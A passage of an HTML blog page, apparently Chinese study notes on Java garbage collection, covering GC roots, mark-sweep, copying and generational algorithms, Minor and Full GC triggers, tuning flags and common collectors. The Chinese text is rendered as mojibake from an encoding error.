href="#%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95">åƒåœ¾å›æ”¶ç®—æ³•</a><ul><li><a href="#%E6%A0%87%E8%AE%B0-%E6%B8%85%E9%99%A4%E7%AE%97%E6%B3%95mark-and-sweep-">æ ‡è®°-æ¸…é™¤ç®—æ³•ï¼ˆMark and Sweepï¼‰-</a><ul><li><a href="#%E7%BC%BA%E7%82%B9">ç¼ºç‚¹ï¼š</a></li></ul></li><li><a href="#%E5%A4%8D%E5%88%B6%E7%AE%97%E6%B3%95copying-">å¤åˆ¶ç®—æ³•ï¼ˆCopyingï¼‰-</a><ul><li><a href="#%E4%BC%98%E7%82%B9">ä¼˜ç‚¹ï¼š</a></li><li><a href="#%E7%BC%BA%E7%82%B9-1">ç¼ºç‚¹ï¼š</a></li></ul></li><li><a href="#%E6%A0%87%E8%AE%B0-%E6%95%B4%E7%90%86%E7%AE%97%E6%B3%95compacting%E6%AF%94%E8%BE%83%E9%80%82%E7%94%A8%E4%BA%8E%E8%80%81%E5%B9%B4%E4%BB%A3%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6-">æ ‡è®°-æ•´ç†ç®—æ³•ï¼ˆCompactingï¼‰æ¯”è¾ƒé€‚ç”¨äºè€å¹´ä»£çš„åƒåœ¾å›æ”¶ -</a><ul><li><a href="#%E7%89%B9%E7%82%B9">ç‰¹ç‚¹</a></li></ul></li><li><a href="#%E5%88%86%E4%BB%A3%E6%94%B6%E9%9B%86%E7%AE%97%E6%B3%95generational-collector">åˆ†ä»£æ”¶é›†ç®—æ³•ï¼ˆGenerational Collectorï¼‰âˆš</a><ul><li><a href="#gc%E7%9A%84%E5%88%86%E7%B1%BB">GCçš„åˆ†ç±»</a><ul><li><a href="#minor-gc">Minor GC âˆš</a></li><li><a href="#full-gc">Full GC âˆš</a></li></ul></li><li><a href="#%E5%B9%B4%E8%BD%BB%E4%BB%A3%E5%B0%BD%E5%8F%AF%E8%83%BD%E5%BF%AB%E9%80%9F%E5%9C%B0%E6%94%B6%E9%9B%86%E6%8E%89%E9%82%A3%E4%BA%9B%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%9F%AD%E7%9A%84%E5%AF%B9%E8%B1%A1">å¹´è½»ä»£ï¼šå°½å¯èƒ½å¿«é€Ÿåœ°æ”¶é›†æ‰é‚£äº›ç”Ÿå‘½å‘¨æœŸçŸ­çš„å¯¹è±¡ âˆš</a></li><li><a href="#%E5%AF%B9%E8%B1%A1%E5%A6%82%E4%BD%95%E6%99%8B%E5%8D%87%E5%88%B0%E8%80%81%E5%B9%B4%E4%BB%A3">å¯¹è±¡å¦‚ä½•æ™‹å‡åˆ°è€å¹´ä»£ âˆš</a></li><li><a href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E8%B0%83%E4%BC%98%E5%8F%82%E6%95%B0">å¸¸ç”¨çš„è°ƒä¼˜å‚æ•°</a></li><li><a href="#%E8%A7%A6%E5%8F%91full-gc%E7%9A%84%E6%9D%A1%E4%BB%B63%E7%82%B9%E5%8D%B3%E5%8F%AF">è§¦å‘Full GCçš„æ¡ä»¶ï¼ˆ3ç‚¹å³å¯ï¼‰ âˆš</a></li><li><a href="#%E8%A7%A6%E5%8F%91minor-gc%E7%9A%84%E6%9D%A1%E4%BB%B6-">è§¦å‘Minor GCçš„æ¡ä»¶ -</a></li><li><a href="#stop-the-world">Stop-the-World âˆš</a></li><li><a href="#safepoint-">Safepoint -</a></li></ul></li></ul></li><li><a href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8">å¸¸è§çš„åƒåœ¾æ”¶é›†å™¨</a><ul><li><a href="#jvm%E7%9A%84%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F">JVMçš„è¿è¡Œæ¨¡å¼ï¼šâˆš</a></li><li><a href="#%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8%E4%B9%8B%E9%97%B4%E7%9A%84%E8%81%94%E7%B3%BB">åƒåœ¾æ”¶é›†å™¨ä¹‹é—´çš„è”ç³»</a></li><li><a href="#%E5%B9%B4%E8%BD%BB%E4%BB%A3%E5%B8%B8%E8%A7%81%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8">å¹´è½»ä»£å¸¸è§åƒåœ¾æ”¶é›†å™¨</a><ul><li><a href="#serial%E6%94%B6%E9%9B%86%E5%99%A8">Serialæ”¶é›†å™¨ âˆš</a></li><li><a href="#parnew%E6%94%B6%E9%9B%86%E5%99%A8">ParNewæ”¶é›†å™¨ âˆš</a></li><li><a href="#parallel-scavenge%E6%94%B6%E9%9B%86%E5%99%A8">Parallel Scavengeæ”¶é›†å™¨ âˆš</a></li></ul></li><li><a href="#%E8%80%81%E5%B9%B4%E4%BB%A3%E5%B8%B8%E8%A7%81%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8">è€å¹´ä»£å¸¸è§åƒåœ¾æ”¶é›†å™¨</a><ul><li><a href="#serial-old%E6%94%B6%E9%9B%86%E5%99%A8">Serial Oldæ”¶é›†å™¨ âˆš</a></li><li><a href="#parallel-old%E6%94%B6%E9%9B%86%E5%99%A8-">Parallel Oldæ”¶é›†å™¨ -</a></li><li><a href="#cms%E6%94%B6%E9%9B%86%E5%99%A8-">CMSæ”¶é›†å™¨ -</a></li></ul></li><li><a href="#g1%E6%94%B6%E9%9B%86%E5%99%A8-">G1æ”¶é›†å™¨ -</a><ul><li><a href="#garbage-first%E6%94%B6%E9%9B%86%E5%99%A8%E7%9A%84%E7%89%B9%E7%82%B9">Garbage Firstæ”¶é›†å™¨çš„ç‰¹ç‚¹</a></li></ul></li></ul><ul><li><a href="#object%E7%9A%84finalize%E6%96%B9%E6%B3%95%E6%98%AF%E5%90%A6%E4%B8%8Ec%E7%9A%84%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0%E4%BD%9C%E7%94%A8%E7%9B%B8%E5%90%8C-">Objectçš„finalizeï¼ˆï¼‰æ–¹æ³•æ˜¯å¦ä¸C++çš„ææ„å‡½æ•°ä½œç”¨ç›¸åŒ -</a></li><li><a href="#java%E4%B8%AD%E7%9A%84%E5%BC%BA%E5%BC%95%E7%94%A8%E8%BD%AF%E5%BC%95%E7%94%A8%E5%BC%B1%E5%BC%95%E7%94%A8%E8%99%9A%E5%BC%95%E7%94%A8%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8">Javaä¸­çš„å¼ºå¼•ç”¨ï¼Œè½¯å¼•ç”¨ï¼Œå¼±å¼•ç”¨ï¼Œè™šå¼•ç”¨æœ‰ä»€ä¹ˆç”¨</a><ul><li><a href="#%E5%BC%BA%E5%BC%95%E7%94%A8strong-reference">å¼ºå¼•ç”¨ï¼ˆStrong Referenceï¼‰âˆš</a></li><li><a href="#%E8%BD%AF%E5%BC%95%E7%94%A8soft-reference">è½¯å¼•ç”¨ï¼ˆSoft Referenceï¼‰âˆš</a></li><li><a href="#%E5%BC%B1%E5%BC%95%E7%94%A8weak-reference">å¼±å¼•ç”¨ï¼ˆWeak Referenceï¼‰âˆš</a></li><li><a href="#%E8%99%9A%E5%BC%95%E7%94%A8phantomreference-">è™šå¼•ç”¨ï¼ˆPhantomReferenceï¼‰-</a></li></ul></li><li><a href="#%E5%BC%95%E7%94%A8%E9%98%9F%E5%88%97referencequeue-">å¼•ç”¨é˜Ÿåˆ—ReferenceQueue -</a></li></ul></li></ul><!-- tocstop --><p><img src="/2020/03/28/Java-GC/image-20200328164459719.png" alt="çŸ¥è¯†å›¾è°±"></p><h2><span id="è‡ªåŠ¨åŒ–è§£å†³äº†">è‡ªåŠ¨åŒ–è§£å†³äº†ï¼šâˆš</span></h2><p>ç¬¬ä¸€ä¸ªå¯¹è±¡å†…å­˜åˆ†é…çš„é—®é¢˜ã€‚</p><p>ç¬¬äºŒä¸ªå›æ”¶åˆ†é…ç»™å¯¹è±¡çš„å†…å­˜çš„é—®é¢˜</p><p><strong>æ´»åŠ¨äºJava å †</strong></p><h2><span id="å¯¹è±¡è¢«åˆ¤å®šä¸ºåƒåœ¾çš„æ ‡å‡†">å¯¹è±¡è¢«åˆ¤å®šä¸ºåƒåœ¾çš„æ ‡å‡†ï¼š âˆš</span></h2><p>æ²¡æœ‰è¢«å…¶ä»–å¯¹è±¡å¼•ç”¨</p><h2><span id="åˆ¤å®šæ–¹æ³•">åˆ¤å®šæ–¹æ³•</span></h2><h3><span id="å¼•ç”¨è®¡æ•°æ³•">å¼•ç”¨è®¡æ•°æ³• âˆš</span></h3><p>Ã˜ é€šè¿‡åˆ¤æ–­å¯¹è±¡çš„å¼•ç”¨æ•°é‡æ¥å†³å®šå¯¹è±¡æ˜¯å¦å¯ä»¥è¢«å›æ”¶</p><p>Ã˜ æ¯ä¸ªå¯¹è±¡å®ä¾‹éƒ½æœ‰ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œè¢«å¼•ç”¨åˆ™+1ï¼Œå®Œæˆå¼•ç”¨åˆ™-1</p><p>Ã˜ ä»»ä½•å¼•ç”¨è®¡æ•°ä¸º0çš„å¯¹è±¡å®ä¾‹éƒ½å¯ä»¥è¢«å½“ä½œåƒåœ¾æ”¶é›†</p><p>Ã˜ <strong>ä¼˜ç‚¹</strong>ï¼šæ‰§è¡Œæ•ˆç‡é«˜ï¼Œç¨‹åºæ‰§è¡Œå—å½±å“è¾ƒå°</p><p>Ã˜ <strong>ç¼ºç‚¹</strong>ï¼šæ— æ³•æ£€æµ‹å‡ºå¾ªç¯å¼•ç”¨çš„æƒ…å†µï¼Œå¯¼è‡´å†…å­˜æ³„æ¼</p><p>å®ä¾‹ï¼š</p><p><img src="/2020/03/28/Java-GC/clip_image001.png" alt="å¾ªç¯å¼•ç”¨"></p><p><img src="/2020/03/28/Java-GC/clip_image002.png" alt="å¾ªç¯å¼•ç”¨"></p><h3><span id="å¯è¾¾æ€§åˆ†æç®—æ³•ä¸»æµ">å¯è¾¾æ€§åˆ†æç®—æ³•ï¼ˆä¸»æµï¼‰âˆš</span></h3><p>é€šè¿‡åˆ¤æ–­å¯¹è±¡çš„å¼•ç”¨é“¾æ˜¯å¦å¯è¾¾æ¥å†³å®šå¯¹è±¡æ˜¯å¦å¯ä»¥è¢«å›æ”¶</p><p><img src="/2020/03/28/Java-GC/clip_image003.png" alt="GCroot"></p><h4><span id="å¯ä»¥ä½œä¸ºgc-rootçš„å¯¹è±¡-">å¯ä»¥ä½œä¸ºGC Rootçš„å¯¹è±¡ -</span></h4><p>Ã˜ è™šæ‹Ÿæœºæ ˆä¸­å¼•ç”¨çš„å¯¹è±¡ï¼ˆæ ˆå¸§ä¸­çš„æœ¬åœ°å˜é‡è¡¨ï¼‰</p><p>Ã˜ æ–¹æ³•åŒºä¸­çš„å¸¸é‡å¼•ç”¨çš„å¯¹è±¡</p><p>Ã˜ æ–¹æ³•åŒºä¸­çš„ç±»é™æ€å±æ€§å¼•ç”¨çš„å¯¹è±¡</p><p>Ã˜ æœ¬åœ°æ–¹æ³•æ ˆä¸­JNIï¼ˆNativeæ–¹æ³•ï¼‰çš„å¼•ç”¨å¯¹è±¡</p><p>Ã˜ æ´»è·ƒçº¿ç¨‹çš„å¼•ç”¨å¯¹è±¡</p><h2><span id="åƒåœ¾å›æ”¶ç®—æ³•">åƒåœ¾å›æ”¶ç®—æ³•</span></h2><h3><span id="æ ‡è®°-æ¸…é™¤ç®—æ³•mark-and-sweep-">æ ‡è®°-æ¸…é™¤ç®—æ³•ï¼ˆMark and Sweepï¼‰-</span></h3><p>Ã˜ æ ‡è®°ï¼š<font color="red">ä»æ ¹é›†åˆè¿›è¡Œæ‰«æ</font>ï¼Œå¯¹å­˜æ´»çš„å¯¹è±¡è¿›è¡Œæ ‡è®°</p><p>Ã˜ æ¸…é™¤ï¼šå¯¹å †å†…å­˜ä»å¤´åˆ°å°¾è¿›è¡Œçº¿æ€§éå†ï¼Œå›æ”¶ä¸å¯è¾¾å¯¹è±¡å†…å­˜</p><p><img src="/2020/03/28/Java-GC/clip_image001-1585385927983.png"></p><h4><span id="ç¼ºç‚¹">ç¼ºç‚¹ï¼š</span></h4><p>Ã˜ <strong>ç¢ç‰‡åŒ–</strong></p><p>ç”±äºæ ‡è®°æ¸…é™¤ä¸éœ€è¦è¿›è¡Œå¯¹è±¡çš„ç§»åŠ¨å¹¶ä¸”ä»…å¯¹ä¸å­˜æ´»çš„å¯¹è±¡è¿›è¡Œå¤„ç†ï¼Œå› æ­¤æ ‡è®°æ¸…é™¤åä¼šäº§ç”Ÿå¤§é‡ä¸è¿ç»­çš„å†…å­˜ç¢ç‰‡ï¼Œç©ºé—´ç¢ç‰‡å¤ªå¤šå¯èƒ½ä¼šå¯¼è‡´ä»¥ååœ¨ç¨‹åºè¿è¡Œä¸­éœ€è¦åˆ†é…è¾ƒå¤§çš„å¯¹è±¡æ—¶æ— æ³•æ‰¾åˆ°è¶³å¤Ÿçš„è¿ç»­å†…å­˜è€Œä¸å¾—ä¸æå‰è§¦å‘å¦ä¸€æ¬¡åƒåœ¾å›æ”¶å·¥ä½œã€‚</p><h3><span id="å¤åˆ¶ç®—æ³•copying-">å¤åˆ¶ç®—æ³•ï¼ˆCopyingï¼‰-</span></h3><p>Ã˜ åˆ†ä¸ºå¯¹è±¡é¢å’Œç©ºé—²é¢</p><p>Ã˜ å¯¹è±¡åœ¨å¯¹è±¡é¢åˆ›å»º</p><p>Ã˜ å­˜æ´»çš„å¯¹è±¡è¢«ä»å¯¹è±¡é¢å¤åˆ¶åˆ°ç©ºé—²é¢</p><p>Ã˜ å°†å¯¹è±¡é¢æ‰€æœ‰å¯¹è±¡å†…å­˜æ¸…é™¤ </p><h4><span id="ä¼˜ç‚¹">ä¼˜ç‚¹ï¼š</span></h4><p>Ã˜ è§£å†³ç¢ç‰‡åŒ–é—®é¢˜</p><p>Ã˜ é¡ºåºåˆ†é…å†…å­˜ï¼Œç®€å•é«˜æ•ˆ</p><p>Ã˜ é€‚ç”¨äºå¯¹è±¡å­˜æ´»ç‡ä½çš„åœºæ™¯ </p><p><img src="/2020/03/28/Java-GC/clip_image003.jpg"></p><h4><span id="ç¼ºç‚¹">ç¼ºç‚¹ï¼š</span></h4><p>å¤åˆ¶æ”¶é›†ç®—æ³•åœ¨åº”å¯¹å¯¹è±¡å­˜æ´»ç‡è¾ƒé«˜çš„æƒ…å†µæ—¶ï¼Œè¦è¿›è¡Œè¾ƒå¤šçš„å¤åˆ¶æ“ä½œï¼Œæ•ˆç‡å°†ä¼šå˜ä½ã€‚å¦‚æœä¸æƒ³æµªè´¹ç™¾åˆ†ä¹‹50çš„ç©ºé—´ï¼Œå°±è¦æœ‰é¢å¤–ç©ºé—´åˆ†é…æ‹…ä¿ä»¥åº”å¯¹è¢«ä½¿ç”¨çš„å†…å­˜ä¸­æ‰€æœ‰å¯¹è±¡éƒ½å­˜æ´»çš„æç«¯æƒ…å†µã€‚ï¼ˆåœ¨è€å¹´ä»£ä¸èƒ½ç›´æ¥ä½¿ç”¨è¿™ç§ç®—æ³•ï¼‰ </p><h3><span id="æ ‡è®°-æ•´ç†ç®—æ³•compactingæ¯”è¾ƒé€‚ç”¨äºè€å¹´ä»£çš„åƒåœ¾å›æ”¶-">æ ‡è®°-æ•´ç†ç®—æ³•ï¼ˆCompactingï¼‰æ¯”è¾ƒé€‚ç”¨äºè€å¹´ä»£çš„åƒåœ¾å›æ”¶ -</span></h3><p>Ã˜ æ ‡è®°ï¼šä»æ ¹é›†åˆè¿›è¡Œæ‰«æï¼Œå¯¹å­˜æ´»çš„å¯¹è±¡è¿›è¡Œæ ‡è®°</p><p>Ã˜ æ¸…é™¤ï¼šç§»åŠ¨æ‰€æœ‰å­˜æ´»çš„å¯¹è±¡ï¼Œä¸”æŒ‰ç…§å†…å­˜åœ°å€æ¬¡åºä¾æ¬¡æ’åˆ—ï¼Œç„¶åå°†æœ«ç«¯å†…å­˜åœ°å€ä»¥åçš„å†…å­˜å…¨éƒ¨å›æ”¶ã€‚ </p><h4><span id="ç‰¹ç‚¹">ç‰¹ç‚¹</span></h4><p>Ã˜ é¿å…å†…å­˜çš„ä¸è¿ç»­è¡Œ</p><p>Ã˜ ä¸ç”¨è®¾ç½®ä¸¤å—å†…å­˜äº¤æ¢</p><p>Ã˜ é€‚ç”¨äºå­˜æ´»ç‡é«˜çš„åœºæ™¯ </p><p><img src="/2020/03/28/Java-GC/clip_image005.jpg"></p><h3><span id="åˆ†ä»£æ”¶é›†ç®—æ³•generational-collector">åˆ†ä»£æ”¶é›†ç®—æ³•ï¼ˆGenerational Collectorï¼‰âˆš</span></h3><p>Ã˜ åƒåœ¾å›æ”¶ç®—æ³•çš„ç»„åˆæ‹³</p><p>Ã˜ æŒ‰ç…§å¯¹è±¡ç”Ÿå‘½å‘¨æœŸçš„ä¸åŒåˆ’åˆ†åŒºåŸŸä»¥é‡‡ç”¨ä¸åŒçš„åƒåœ¾å›æ”¶ç®—æ³•</p><p>Ã˜ ç›®çš„ï¼šæé«˜JVMçš„å›æ”¶æ•ˆç‡</p><p><img src="/2020/03/28/Java-GC/image-20200328171210066.png"></p><p><img src="/2020/03/28/Java-GC/image-20200328171218664.png"></p><h4><span id="gcçš„åˆ†ç±»">GCçš„åˆ†ç±»</span></h4><h5><span id="minor-gc">Minor GC âˆš</span></h5><p>å‘ç”Ÿåœ¨å¹´è½»ä»£ä¸­çš„åƒåœ¾æ”¶é›†å·¥ä½œï¼Œæ‰€é‡‡ç”¨çš„æ˜¯<strong>å¤åˆ¶ç®—æ³•</strong>ï¼Œå¹´è½»ä»£å‡ ä¹æ˜¯æ‰€æœ‰javaå¯¹è±¡å‡ºç”Ÿçš„åœ°æ–¹ï¼ˆå³javaå†…å­˜çš„ç”³è¯·å’Œå­˜æ”¾éƒ½æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹ï¼‰ï¼Œjavaä¸­çš„å¤§éƒ¨åˆ†å¯¹è±¡é€šå¸¸ä¸éœ€è¦é•¿ä¹…çš„å­˜æ´»ï¼Œå› æ­¤æ–°ç”Ÿä»£æ˜¯GCæ”¶é›†åƒåœ¾çš„é¢‘ç¹åŒºåŸŸã€‚</p><h5><span id="full-gc">Full GC âˆš</span></h5><p>ç”±äºè€å¹´ä»£çš„åƒåœ¾çš„å›æ”¶ä¸€èˆ¬ä¼šä¼´éšç€å¹´è½»ä»£çš„åƒåœ¾æ”¶é›†ï¼Œå› æ­¤ç§°ä¸ºFull GC</p><h4><span id="å¹´è½»ä»£å°½å¯èƒ½å¿«é€Ÿåœ°æ”¶é›†æ‰é‚£äº›ç”Ÿå‘½å‘¨æœŸçŸ­çš„å¯¹è±¡">å¹´è½»ä»£ï¼šå°½å¯èƒ½å¿«é€Ÿåœ°æ”¶é›†æ‰é‚£äº›ç”Ÿå‘½å‘¨æœŸçŸ­çš„å¯¹è±¡ âˆš</span></h4><p>Ã˜ EdenåŒºï¼ˆæ–°çš„å¯¹è±¡é¦–å…ˆæ”¾å…¥EdenåŒºï¼Œå¦‚æœæ”¾ä¸ä¸‹å¯èƒ½æ”¾åˆ°survivorç”šè‡³æ˜¯è€å¹´ä»£ä¸­ï¼‰</p><p>Ã˜ ä¸¤ä¸ªSurvivoråŒºï¼ˆåˆ†ä¸ºFromåŒºå’ŒToåŒºï¼‰</p><p><img src="/2020/03/28/Java-GC/image-20200328171413003.png"></p><p><img src="/2020/03/28/Java-GC/image-20200328171420212.png"></p><p><img src="/2020/03/28/Java-GC/image-20200328171426946.png"></p><p>å¦‚æœå¯¹è±¡åœ¨Edenå‡ºç”Ÿï¼Œå¹¶ä¸”è¢«æŒ¤æ»¡ï¼š</p><p>ä¼šè§¦å‘ä¸€æ¬¡Minor GCï¼Œå¦‚æœæ­¤æ—¶å¯¹è±¡å­˜æ´»ï¼Œå°±ä¼šè¢«å¤åˆ¶åˆ°ä¸€å—survivoråŒºä¸­</p><p>æˆ‘ä»¬å‡è®¾å¤åˆ¶åˆ°s0ä¸­ï¼Œç§°s0ä¸ºfromåŒºåŸŸï¼Œæ¸…ç†æ‰€æœ‰ä½¿ç”¨è¿‡çš„EdenåŒºåŸŸï¼Œå¹¶å°†å­˜æ´»å¯¹è±¡çš„å¹´é¾„è®¾ç½®æˆ1.</p><p><img src="/2020/03/28/Java-GC/image-20200328171437728.png"></p><p>å‡è®¾EdenåŒºå†æ¬¡å¡«æ»¡</p><p><img src="/2020/03/28/Java-GC/image-20200328171447785.png"></p><p>å†æ¬¡è§¦å‘Minor GCï¼Œç„¶åå°†Edenä¸­å’ŒS0ä¸­çš„å­˜æ´»å¯¹è±¡æ‹·è´åˆ°s1ä¸­å¹¶å°†å¹´é¾„+1</p><p>æ­¤æ—¶s1ä»toåŒºå˜æˆäº†fromåŒºï¼Œs0ä»fromåŒºå˜æˆäº†toåŒºã€‚æ‹·è´å®ŒæˆåEdenå’Œs0å‡è¢«æ¸…ç©ºï¼Œè¿™æ ·ä¾¿å®Œæˆäº†ç¬¬äºŒæ¬¡Minor GC</p><p><img src="/2020/03/28/Java-GC/image-20200328171458250.png"></p><p>å‡è®¾æ­¤æ—¶EdenåŒºåˆæ»¡äº†ï¼Œè§¦å‘äº†ç¬¬ä¸‰æ¬¡Minor GCã€‚</p><p><img src="/2020/03/28/Java-GC/image-20200328171510652.png"></p><p>å½“å¯¹è±¡å¹´é¾„è¾¾åˆ°æŸä¸ªå€¼æ—¶è¿™äº›å¯¹è±¡ä¼šæˆä¸ºè€å¹´ä»£ï¼ˆé»˜è®¤æ˜¯15å²ï¼‰ï¼Œä¹Ÿå¯ä»¥ç”¨-XX:MaxTenuringThresholdæ¥è°ƒæ•´ã€‚è¿™ä¹Ÿä¸æ˜¯ä¸€å®šçš„ï¼Œå¯¹äºä¸€äº›è¾ƒå¤§çš„å¯¹è±¡å³éœ€åˆ†é…ä¸€å—è¾ƒå¤§çš„è¿ç»­ç©ºé—´çš„å¯¹è±¡å°±ä¼šè¿›å…¥åˆ°è€å¹´ä»£ã€‚</p><h4><span id="å¯¹è±¡å¦‚ä½•æ™‹å‡åˆ°è€å¹´ä»£">å¯¹è±¡å¦‚ä½•æ™‹å‡åˆ°è€å¹´ä»£ âˆš</span></h4><p>Ã˜ ç»å†ä¸€å®šMinoræ¬¡æ•°ä¾ç„¶å­˜æ´»çš„å¯¹è±¡</p><p>Ã˜ SurvivoråŒºä¸­å­˜æ”¾ä¸ä¸‹çš„å¯¹è±¡</p><p>Ã˜ æ–°ç”Ÿæˆçš„å¤§å¯¹è±¡ï¼ˆ-XXï¼š+PretenuerSizeThresholdï¼‰</p><h4><span id="å¸¸ç”¨çš„è°ƒä¼˜å‚æ•°">å¸¸ç”¨çš„è°ƒä¼˜å‚æ•°</span></h4><p>Ã˜ -XX:SurvivorRatio: Edenå’ŒSurvivorçš„æ¯”å€¼ï¼Œé»˜è®¤8:1</p><p>Ã˜ -XXï¼šNewRatioï¼šè€å¹´ä»£å¹´è½»ä»£å†…å­˜å¤§å°çš„æ¯”ä¾‹ 1:2</p><p>Ã˜ -XXï¼šMaxTenuringThresholdï¼šå¯¹è±¡ä»å¹´è½»ä»£æ™‹å‡åˆ°è€å¹´ä»£ç»è¿‡GCæ¬¡æ•°çš„æœ€å¤§é˜ˆå€¼</p><p><strong>ä½¿ç”¨-Xmså’Œ-Xmxæ¥è®¾ç½®è€å¹´ä»£å’Œå¹´è½»ä»£å†…å­˜å¤§å°</strong></p><p><img src="/2020/03/28/Java-GC/image-20200328172048512.png"></p><p>Full GCå’ŒMajor GCï¼ˆå•æŒ‡è€å¹´ä»£æˆ–è€…ç­‰ä»·äºFull GC çœ‹å…¶ä»–äººæ€ä¹ˆå®šä¹‰ï¼‰</p><p>Full GCæ¯”Minor GCæ…¢å¾—å¤šï¼Œä½†æ˜¯æ‰§è¡Œé¢‘ç‡ä½</p><h4><span id="è§¦å‘full-gcçš„æ¡ä»¶3ç‚¹å³å¯">è§¦å‘Full GCçš„æ¡ä»¶ï¼ˆ3ç‚¹å³å¯ï¼‰ âˆš</span></h4><p>Ã˜ è€å¹´ä»£ç©ºé—´ä¸è¶³</p><p>Ã˜ æ°¸ä¹…ä»£ç©ºé—´ä¸è¶³</p><p>Ã˜ CMS GCæ—¶å‡ºç°promotion failed, concurrent mode failure</p><p>Ã˜ Minor GCæ™‹å‡è€å¹´ä»£çš„å¹³å‡å¤§å°å¤§äºè€å¹´ä»£çš„å‰©ä½™ç©ºé—´</p><p>Ã˜ è°ƒç”¨System.gc();</p><p>Ã˜ ä½¿ç”¨RMIæ¥è¿›è¡ŒRPCæˆ–ç®¡ç†çš„JDKåº”ç”¨ï¼Œæ¯å°æ—¶æ‰§è¡Œä¸€æ¬¡Full GC</p><p>Promotion failedæ˜¯åœ¨è¿›è¡Œminor GCçš„æ—¶å€™Survivor spaceæ”¾ä¸ä¸‹ï¼Œå¯¹è±¡åªèƒ½æ”¾å…¥è€å¹´ä»£ï¼Œä½†æ˜¯æ­¤æ—¶è€å¹´ä»£ä¹Ÿæ”¾ä¸ä¸‹ã€‚</p><p>Concurrent mode failureæ˜¯åœ¨è¿›è¡ŒCMS GCçš„æ—¶å€™åŒæ—¶æœ‰å¯¹è±¡è¦æ”¾å…¥è€å¹´ä»£ä¸­ï¼Œè€Œæ­¤æ—¶è€å¹´ä»£ç©ºé—´ä¸è¶³ã€‚</p><h4><span id="è§¦å‘minor-gcçš„æ¡ä»¶-">è§¦å‘Minor GCçš„æ¡ä»¶ -</span></h4><p>å½“edenåŒºæ»¡äº†</p><h4><span id="stop-the-world">Stop-the-World âˆš</span></h4><p>Ã˜ JVMç”±äºè¦æ‰§è¡ŒGCè€Œåœæ­¢äº†åº”ç”¨ç¨‹åºçš„æ‰§è¡Œ</p><p>Ã˜ ä»»ä½•ä¸€ç§GCç®—æ³•ä¸­éƒ½ä¼šå‘ç”Ÿ</p><p>Ã˜ å¤šæ•°GCä¼˜åŒ–é€šè¿‡å‡å°‘Stop-the-worldå‘ç”Ÿçš„æ—¶é—´æ¥æé«˜ç¨‹åºæ€§èƒ½</p><h4><span id="safepoint-">Safepoint -</span></h4><p>å®‰å…¨ç‚¹å°±æ˜¯æŒ‡ï¼Œå½“çº¿ç¨‹è¿è¡Œåˆ°è¿™ç±»ä½ç½®æ—¶ï¼Œå †å¯¹è±¡çŠ¶æ€æ˜¯ç¡®å®šä¸€è‡´çš„ï¼ŒJVMå¯ä»¥å®‰å…¨åœ°è¿›è¡Œæ“ä½œï¼Œå¦‚GCï¼Œåå‘é”è§£é™¤ç­‰ã€‚</p><p>Ã˜ åˆ†æè¿‡ç¨‹ä¸­å¯¹è±¡å¼•ç”¨å…³ç³»ä¸ä¼šå‘ç”Ÿå˜åŒ–çš„ç‚¹</p><p>Ã˜ äº§ç”ŸSafepointçš„åœ°æ–¹ï¼šæ–¹æ³•è°ƒç”¨ï¼›å¾ªç¯è·³è½¬ï¼›å¼‚å¸¸è·³è½¬ç­‰</p><p>Ã˜ å®‰å…¨ç‚¹æ•°é‡å¾—é€‚ä¸­</p><h2><span id="å¸¸è§çš„åƒåœ¾æ”¶é›†å™¨">å¸¸è§çš„åƒåœ¾æ”¶é›†å™¨</span></h2><p>é™¤äº†CMSéƒ½æ˜¯ å¹´è½»ä»£å¤åˆ¶ï¼Œ è€å¹´ä»£æ ‡è®°æ•´ç†</p><h4><span id="jvmçš„è¿è¡Œæ¨¡å¼">JVMçš„è¿è¡Œæ¨¡å¼ï¼šâˆš</span></h4><p>Ã˜ Server</p><p>Ã˜ Client </p><p>Serverå¯åŠ¨æ…¢ï¼Œç¨³å®šåè¿è¡Œå—</p><p>Clientå¯åŠ¨å¿«ã€‚</p><p>ä½¿ç”¨java â€“versionå°±èƒ½çœ‹åˆ°è¿è¡Œåœ¨å“ªä¸ªæ¨¡å¼ä¸‹</p><h4><span id="åƒåœ¾æ”¶é›†å™¨ä¹‹é—´çš„è”ç³»">åƒåœ¾æ”¶é›†å™¨ä¹‹é—´çš„è”ç³»</span></h4><p><img src="/2020/03/28/Java-GC/clip_image001-1585387688405.png"></p><p>æœ‰è¿çº¿ä»£è¡¨å¯ä»¥ç»“åˆä½¿ç”¨ã€‚</p><h4><span id="å¹´è½»ä»£å¸¸è§åƒåœ¾æ”¶é›†å™¨">å¹´è½»ä»£å¸¸è§åƒåœ¾æ”¶é›†å™¨</span></h4><h5><span id="serialæ”¶é›†å™¨">Serialæ”¶é›†å™¨ âˆš</span></h5><p><img src="/2020/03/28/Java-GC/image-20200328172855756.png"></p><h5><span id="parnewæ”¶é›†å™¨">ParNewæ”¶é›†å™¨ âˆš</span></h5><p><img src="/2020/03/28/Java-GC/image-20200328172935139.png"></p><h5><span id="parallel-scavengeæ”¶é›†å™¨">Parallel Scavengeæ”¶é›†å™¨ âˆš</span></h5><p><img src="/2020/03/28/Java-GC/clip_image002.jpg"></p><p><strong>ååé‡&#x3D;ï¼ˆè¿è¡Œç”¨æˆ·ä»£ç æ—¶é—´ï¼‰&#x2F;ï¼ˆåƒåœ¾æ”¶é›†æ—¶é—´+è¿è¡Œç”¨æˆ·ä»£ç æ—¶é—´ï¼‰</strong></p><h4><span id="è€å¹´ä»£å¸¸è§åƒåœ¾æ”¶é›†å™¨">è€å¹´ä»£å¸¸è§åƒåœ¾æ”¶é›†å™¨</span></h4><h5><span id="serial-oldæ”¶é›†å™¨">Serial Oldæ”¶é›†å™¨ âˆš</span></h5><p><img src="/2020/03/28/Java-GC/clip_image002-1585388023328.jpg"></p><h5><span id="parallel-oldæ”¶é›†å™¨-">Parallel 